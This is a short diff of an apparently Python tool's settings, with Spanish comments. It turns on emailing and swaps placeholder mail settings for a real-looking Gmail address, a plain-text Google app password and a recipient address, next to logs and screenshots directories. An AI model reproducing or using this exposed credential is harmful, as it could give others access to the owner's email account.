@@ -28,13 +28,13 @@ DEFAULT_PORT = 9999
 LOG_DIR = "logs"
 SCREENSHOT_DIR = "screenshots"
 
-# ── Configuración de correo (modificar según necesidad) ────
-EMAIL_ENABLED = False
+# ── Configuración de correo ─────────────────────────────────
+EMAIL_ENABLED = True
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
-EMAIL_USER = "tu_correo@gmail.com"
-EMAIL_PASS = "tu_app_password"       # Usar App Password de Google
-EMAIL_TO = "destino@gmail.com"
+EMAIL_USER = "m4xo25o@gmail.com"
+EMAIL_PASS = "hrmj ysyb ndtj mgse"       # App Password de Google
+EMAIL_TO = "martinezdeif04@gmail.com"
 
 
 def setup_directories():
